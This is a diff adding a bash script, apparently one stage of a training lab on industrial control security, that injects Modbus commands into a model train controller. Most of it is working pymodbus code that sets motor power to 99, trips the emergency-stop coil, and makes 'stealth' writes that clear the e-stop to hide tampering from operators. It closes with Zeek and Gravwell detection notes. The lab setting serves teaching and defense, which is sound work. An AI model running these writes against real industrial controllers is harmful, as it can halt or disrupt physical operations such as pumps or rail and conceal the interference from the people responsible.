@@ -1,0 +1,112 @@
+#!/usr/bin/env bash
+# Stage 2 — Modbus Direct Command Injection (M1, M2)
+#
+# WHAT THIS DEMONSTRATES:
+#   Because Modbus has no authentication, writing to a register is identical
+#   whether you're the authorized HMI or an attacker. The protocol cannot tell
+#   the difference. This stage shows three write targets: motor power, emergency
+#   stop coil, and a stealth "blend in" write that mimics a legitimate operator.
+#
+# MITRE ATT&CK (ICS): T0855 Unauthorized Command Message, T0813 Denial of Control
+#
+# ZEEK VISIBILITY:
+#   modbus.log — FC 5/6 (writes) from attacker IP; address and value logged in cleartext
+set -euo pipefail
+
+CONTROLLER="${CONTROLLER:-controller}"
+PORT="${PORT:-5020}"
+
+echo "=== [modbus-inject] Stage 2: Direct register write ==="
+echo ""
+echo "  From the recon stage we know: HR 0 = motor power, Coil 0 = e-stop, MAX_POWER = 50."
+echo "  We now write to each directly. No handshake, no token, no challenge — just TCP."
+echo ""
+
+echo "--- Write HR 0 = 99 (full speed ahead) ---"
+echo "  FC 6: Write Single Register. One packet, one write."
+echo "  The controller will clamp the value to MAX_POWER (50) before driving the train,"
+echo "  but Zeek captures the raw wire value of 99 — the intent is on the log."
+python3 - <<'PY'
+import asyncio, os
+from pymodbus.client import AsyncModbusTcpClient
+async def go():
+    c = AsyncModbusTcpClient(os.environ.get("CONTROLLER","controller"),
+                             port=int(os.environ.get("PORT","5020")))
+    await c.connect()
+    await c.write_register(0, 99)
+    print("  Wrote HR 0 = 99  ->  train clamped to MAX_POWER, but wire shows 99")
+    c.close()
+asyncio.run(go())
+PY
+echo ""
+
+sleep 2
+
+echo "--- Confirm the write with a read-back ---"
+python3 - <<'PY'
+import asyncio, os
+from pymodbus.client import AsyncModbusTcpClient
+async def go():
+    c = AsyncModbusTcpClient(os.environ.get("CONTROLLER","controller"),
+                             port=int(os.environ.get("PORT","5020")))
+    await c.connect()
+    rr = await c.read_holding_registers(0, count=1)
+    print(f"  HR[0] = {rr.registers[0]}  (controller stored the attacker's value)")
+    c.close()
+asyncio.run(go())
+PY
+echo ""
+
+sleep 2
+
+echo "--- Trip Coil 0 (Emergency Stop) ---"
+echo "  FC 5: Write Single Coil. This is the highest-impact write in the point map."
+echo "  Writing True to Coil 0 halts the train immediately — no operator confirmation,"
+echo "  no warning, no delay. This is the Modbus equivalent of pulling the safety relay."
+echo "  In a real ICS (water pump, conveyor, rail wayside) this stops physical operations."
+python3 - <<'PY'
+import asyncio, os
+from pymodbus.client import AsyncModbusTcpClient
+async def go():
+    c = AsyncModbusTcpClient(os.environ.get("CONTROLLER","controller"),
+                             port=int(os.environ.get("PORT","5020")))
+    await c.connect()
+    await c.write_coil(0, True)
+    print("  Coil 0 = True  ->  E-stop tripped, train halted")
+    c.close()
+asyncio.run(go())
+PY
+echo ""
+
+sleep 2
+
+echo "--- Stealth write: blend in with normal operator traffic ---"
+echo "  The smart attacker doesn't hold power at 99 — that's noisy."
+echo "  Instead: write power=50 (exactly MAX_POWER, looks like a normal operator move)"
+echo "  and clear the e-stop so nothing looks wrong on the dashboard."
+echo "  Zeek still logs both writes from our IP — but to a casual observer the values"
+echo "  look legitimate. Detection requires allowlisting the operator's source IP."
+python3 - <<'PY'
+import asyncio, os
+from pymodbus.client import AsyncModbusTcpClient
+async def go():
+    c = AsyncModbusTcpClient(os.environ.get("CONTROLLER","controller"),
+                             port=int(os.environ.get("PORT","5020")))
+    await c.connect()
+    await c.write_register(0, 50)
+    print("  Wrote HR 0 = 50  (matches MAX_POWER — blends with normal traffic)")
+    await c.write_coil(0, False)
+    print("  Cleared e-stop  (no visible alarm on operator dashboard)")
+    c.close()
+asyncio.run(go())
+PY
+
+echo ""
+echo "[modbus-inject] Done."
+echo ""
+echo "Gravwell query to see the writes:"
+echo "  tag=zeek grep \"\\\"_path\\\":\\\"modbus\\\"\" grep \"WRITE\" | json \"id.orig_h\" func | count by func | table func count"
+echo ""
+echo "Key detection signal: FC 5/6 writes from any IP that isn't the legitimate HMI."
+echo "  In this environment the only authorized writer is the web UI (choochoo-web-modbus)."
+echo "  Any other source IP issuing writes is unauthorized."
